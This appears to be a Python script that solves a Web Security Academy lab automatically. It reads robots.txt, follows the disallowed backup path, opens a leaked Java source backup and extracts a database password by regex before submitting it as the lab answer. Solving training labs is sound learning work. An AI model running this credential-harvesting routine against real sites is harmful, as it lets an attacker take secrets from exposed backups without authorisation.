from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    # robots.txt
    logger.info('Visiting "/robots.txt"...')
    resp = session.get_path("/robots.txt")
    if resp.status_code != 200:
        logger.failure("Unable to visit path.")
        return
    else:
        logger.success("GET request came back with the following response:")
        print(resp.text)

    # Extracting and visiting /backup
    match = re.search(r"Disallow: (.*)\n", resp.text)
    if match is None:
        logger.failure("Unable to find backup path.")
        return
    else:
        backup_path = match.group(1)

    logger.info(f'Visiting "{backup_path}"...')
    resp = session.get_path(backup_path)
    if resp.status_code != 200:
        logger.failure("Unable to visit path.")
        return
    else:
        logger.success("GET request came back with the following response:")
        print(resp.text)

    # Extracting password from /backup/ProductTemplate.java.bak
    soup = BeautifulSoup(resp.text, "lxml")
    query = soup.select_one("a")
    if query is None:
        logger.failure("Unable to find leaked source code.")
        return
    else:
        href = query.get("href")

    logger.info(f'Extracting database password from "{href}"...')
    resp = session.get_path(href)
    query = re.search(r'"([a-z0-9]{32})', resp.text)
    if query is None:
        logger.failure("Unable to extract database password.")
        return
    else:
        password = query.group(1)
        logger.success(f"Database password: {password}")

    session.submit_solution(password)
